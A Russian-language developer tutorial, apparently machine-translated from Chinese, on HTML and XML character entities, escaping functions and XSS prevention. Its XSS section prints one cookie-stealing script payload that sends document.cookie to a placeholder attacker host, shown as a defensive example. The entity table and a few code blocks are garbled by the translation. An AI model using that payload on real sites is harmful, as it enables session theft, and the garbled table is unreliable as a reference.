---
title: "Освоение HTML и XML Character Entities: руководство для разработчиков"
date: 2025-03-19T18:56:18+04:00
slug: "mastering-html-xml-character-entities"
draft: false
cover: "https://jiejue.obs.ap-southeast-1.myhuaweicloud.com/20250319185845640.webp"
tags:
  - "внешняя разработка"
  - "HTML"
  - "XML"
  - "управляющий символ"
---

Когда вы видите на веб-странице перевернутые запятые, знаки "меньше" или другие специальные символы, вы когда-нибудь задумывались, как они правильно отображаются? За этим стоит ряд тщательно разработанных механизмов экранирования. Символьные сущности (Character Entities) - незаменимое знание в front-end разработке, но мало кто разбирается в них систематически. В этой статье мы подведем вас к всестороннему пониманию этих "невидимых героев", чтобы вы в самых разных сценариях разработки с легкостью использовали их.

<! ---далее-->

## Что такое сущность персонажа?

Проще говоря, символьные сущности - это способ представления специальных символов в документах HTML и XML. Подобно тому, как мы используем кодовые слова (секретные коды), когда нам нужно отобразить определенные символы с особым значением в содержимом веб-страницы, нам нужен другой способ их представления.

Например, в HTML символы `<` и `>` используются для определения начала и конца тега. Если вы хотите отобразить эти символы в тексте так, чтобы браузер не воспринял их как часть тега, вам нужно использовать символьные сущности: `&lt;` для `<`, `&gt;` для `>`.

## Зачем нам нужны символьные сущности?

Представьте, что вы - фронтенд-инженер, разрабатывающий сайт для отображения кода. Вам нужно отобразить на странице примеры HTML-кода:

```html
<div class="container">
  <p>Hello, world!</p>
</div>
```.

Если вы поместите этот код непосредственно в HTML-документ, браузер будет интерпретировать его как фактическую структуру HTML, вместо того чтобы отобразить сам код. Вот тут-то и пригодятся символьные сущности, которые нужно преобразовать:

```html
&lt;div class="container"&gt;
  &lt;p&gt;Hello, world!&lt;/p&gt;
&lt;/div&gt;
```

Таким образом, браузер будет корректно отображать оригинальный код, а не интерпретировать его для выполнения.

## Классификация и синтаксис символьных сущностей

### Именованные сущности

Именованные сущности являются наиболее распространенной и легко понимаемой формой символьных сущностей, и они имеют описательные имена в формате __PROTECTED_INLINE_CODE__22__.

Ниже перечислены наиболее часто используемые именованные сущности:

| Имя сущности | Характер | Описание |
| --------|------|------|
| `&lt;` | < | меньше, чем знак |
| `&gt;` | > | больше знака |
| `&amp;` | & | и знак | | `&gt;` | > | и знак | | и знак
| | `&quot;` | " | двойные кавычки |
| `&apos;` | ' | одинарные кавычки (XML и HTML5)|
| | | `&nbsp;` | (пробел) | пробел без переноса строки |
| | `&copy;` | © | Символ авторского права |
| | | `&reg;` | ® | Зарегистрированные товарные знаки |

```mermaid
graph TD
    A["&实体名;"] --> B["浏览器/XML解析器"]
    B --> C["显示对应字符"]
    
    style A fill:#f9f,stroke:#333,stroke-width:2px
    style B fill:#bbf,stroke:#333,stroke-width:2px
    style C fill:#bfb,stroke:#333,stroke-width:2px
```

### Цифровые организации

Цифровые сущности позволяют представлять символы, используя кодировку Unicode, в двух форматах:

1. **Десятичный формат**: `&#数字;`.
   Например, `&#169;` представляет символ авторского права ©

2. **Шестнадцатеричный формат**: `&#x十六进制数;`.
   Пример: `&#xA9;` также обозначает символ авторского права ©.

Обратите внимание, что вместо того, чтобы выводить число, числовая сущность ищет и отображает соответствующий символ на основе введенного числового кода.

```mermaid
graph LR
    A["十进制: &#169;"] --> C["©"]
    B["十六进制: &#xA9;"] --> C
    
    style A fill:#f9f,stroke:#333,stroke-width:2px
    style B fill:#fbf,stroke:#333,stroke-width:2px
    style C fill:#bfb,stroke:#333,stroke-width:2px
```

## Практические сценарии и советы по применению

### 1. Отображение HTML-кода

Когда вам нужно отобразить HTML-код на веб-странице, есть несколько способов сделать это:

**Метод 1: Ручное экранирование**.

Заменяет все специальные символы на соответствующие им символьные сущности:

```javascript
function escapeHTML(html) {
  return html
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

**Метод 2: Используйте теги `<pre>` и `<code>`**.

Эти теги сохраняют форматирование текста, но при этом необходимо экранировать специальные символы:

```html
<pre><code>
&lt;div class="example"&gt;
  &lt;p&gt;这是一个例子&lt;/p&gt;
&lt;/div&gt;
</code></pre>
```

**Метод 3: Использование современной библиотеки инструментов**

Библиотеки подсветки кода, такие как Highlight.js, Prism.js, автоматически обрабатывают экранирование.

### 2. Предотвращение XSS-атак

Межсайтовые скриптовые атаки (XSS) - одна из самых распространенных веб-атак. Если ваш сайт позволяет пользователям добавлять комментарии, злоумышленник может вставить вредоносные скрипты, если пользовательский ввод не обрабатывается:

```html
<script>document.location='http://攻击者网站?cookie='+document.cookie</script>
```.

Такие атаки можно эффективно предотвратить, преобразовав специальные символы в пользовательском вводе в символьные сущности:

```javascript
// 用户输入: <script>alert('XSS')</script>
// 转换后: &lt;script&gt;alert('XSS')&lt;/script&gt;
// 浏览器显示: <script>alert('XSS')</script>（而不执行脚本）
```

### 3. Обработка специальных символов при передаче данных

При взаимодействии внешних и внутренних данных специальные символы часто приводят к ошибкам парсинга. Например, необходимо правильно обрабатывать специальные символы в данных JSON:

```javascript
// 不正确的JSON
{"message": "用户输入了"引号"和<标签>"}

// 正确的JSON（JavaScript自动转义）
{"message": "用户输入了\"引号\"和<标签>"}

// 在HTML中显示时还需要HTML转义
&lt;p&gt;用户输入了&quot;引号&quot;和&lt;标签&gt;&lt;/p&gt;
```.

### 4. Интернационализация и специальные символы

Сущности символов полезны, когда ваш сайт должен отображать различные языки и специальные символы:

```html
<!-- 货币符号 -->
美元: &#36; ($)
欧元: &euro; (€)
英镑: &pound; (£)
日元: &yen; (¥)

<!-- 数学符号 -->
π值约等于3.14: &pi; ≈ 3.14
面积公式: S = &pi;r&sup2;
```.

## Часто задаваемые вопросы и решения

### 1. Проблемы с многоуровневым экранированием

Иногда вы можете столкнуться с несколькими уровнями экранирования, например:

```
&amp;lt; → &lt; → <
```.

Обычно это происходит, когда данные обрабатываются в нескольких системах. Решение заключается в том, чтобы понять поток данных и убедиться, что однократная экранировка выполняется в нужный момент.

### 2. экранирование и удаление экранирования

Иногда необходимо выполнить экранирование на стороне сервера, а затем снять экранирование на стороне клиента:

```javascript
// 服务器端转义
const escapedHTML = '<p>Hello</p>'.replace(/</g, '&lt;').replace(/>/g, '&gt;');
// 发送到客户端: &lt;p&gt;Hello&lt;/p&gt;

// 客户端解转义
function unescapeHTML(html) {
  const textarea = document.createElement('textarea');
  textarea.innerHTML = html;
  return textarea.value;
}

// 或使用DOMParser
const parser = new DOMParser();
const dom = parser.parseFromString('&lt;p&gt;Hello&lt;/p&gt;', 'text/html');
const text = dom.body.textContent; // 得到: <p>Hello</p>
```.

### 3. Поддержка сущностей в различных средах

Не все среды поддерживают символьные сущности:

```mermaid
graph TD
    A[字符实体] --> B{支持环境}
    B -->|支持| C[HTML/XML]
    B -->|支持| D[富文本编辑器]
    B -->|部分支持| E[模板引擎]
    B -->|不支持| F[纯文本]
    B -->|不支持| G[大多数编程语言原生字符串]
    
    style A fill:#f9f,stroke:#333,stroke-width:2px
    style B fill:#bbf,stroke:#333,stroke-width:2px
    style C fill:#bfb,stroke:#333,stroke-width:2px
    style D fill:#bfb,stroke:#333,stroke-width:2px
    style E fill:#ffb,stroke:#333,stroke-width:2px
    style F fill:#fbb,stroke:#333,stroke-width:2px
    style G fill:#fbb,stroke:#333,stroke-width:2px
```.

## Дополнительные приложения и расширенные знания

### Символы Юникода и символьные сущности

Unicode присваивает уникальную кодировку почти каждому символу в мире. Вы можете использовать числовые сущности для представления любого символа Unicode:

```html
<!-- 笑脸表情 -->
&#128512; 或 &#x1F600; → 😀

<!-- 复杂的数学符号 -->
&#8747; 或 &#x222B; → ∫ (积分符号)
```.

### Условные комментарии и символьные сущности

Условные комментарии используются вместе с символьными сущностями при решении проблем совместимости с различными браузерами:

```html
<!--[if IE]>
  &lt;link rel="stylesheet" href="ie-only.css"&gt;
<![endif]-->
```.

### Обработка символьных сущностей в динамически генерируемом контенте

При использовании JavaScript для динамической генерации HTML-контента особое внимание следует уделить обработке символьных сущностей:

```javascript
// 不安全的方式
element.innerHTML = userInput; // 可能导致XSS攻击

// 安全的方式
element.textContent = userInput; // 自动转义
// 或
element.innerHTML = escapeHTML(userInput);
```.

## Инструменты разработчика и справочные ресурсы

### Утилиты

1. **Онлайн-конвертер символьных сущностей**: помогает быстро преобразовать HTML-текст
2. **Инструменты разработчика браузера**: просмотр фактического содержимого HTML при инспектировании элементов
3. **Плагины для редакторов**: например, HTML-плагин VSCode, который автоматически выделяет и конвертирует символьные сущности

### Полная ссылка

Чтобы увидеть полный список символьных сущностей HTML, вы можете обратиться к следующим ресурсам:

1. [Официальный справочник сущностей HTML](https://html.spec.whatwg.org/multipage/named-characters.html)
2. [W3C's Character Entity Reference](https://www.w3.org/TR/html4/sgml/entities.html)

## Заключение

Символьные сущности являются неотъемлемой частью HTML- и XML-документов. Их освоение не только поможет вам решить различные проблемы в повседневной разработке, но и повысит безопасность и интернационализацию вашего сайта. Надеюсь, эта статья поможет вам в полном понимании символьных сущностей, а также в реальной разработке гибкого приложения.

Сталкивались ли вы когда-нибудь с проблемами в процессе разработки из-за неправильного обращения со специальными символами? Решило ли правильное использование символьных сущностей ваши проблемы? Приглашаем применить знания из этой статьи в реальных проектах и подумать о том, как более элегантно решать проблемы многоуровневого экранирования.
